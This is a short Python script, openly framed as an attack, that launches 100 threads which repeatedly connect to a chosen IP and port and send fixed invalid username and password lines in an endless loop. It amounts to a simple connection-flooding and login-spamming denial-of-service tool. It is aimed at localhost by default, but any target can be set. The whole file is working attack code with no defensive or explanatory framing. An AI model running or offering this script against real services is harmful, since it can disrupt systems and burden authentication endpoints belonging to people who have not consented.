import socket
import threading
import time

def attack(target_ip, target_port, num_attackers):
    for _ in range(num_attackers):
        attacker = threading.Thread(target=attack_worker, args=(target_ip, target_port))
        attacker.start()

def attack_worker(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(b'invalid_username\n')
            sock.sendall(b'invalid_password\n')
            sock.close()
        except Exception as e:
            print(f'Error: {e}')
            break

if __name__ == '__main__':
    target_ip = '127.0.0.1'
    target_port = 12345
    num_attackers = 100
    attack(target_ip, target_port, num_attackers)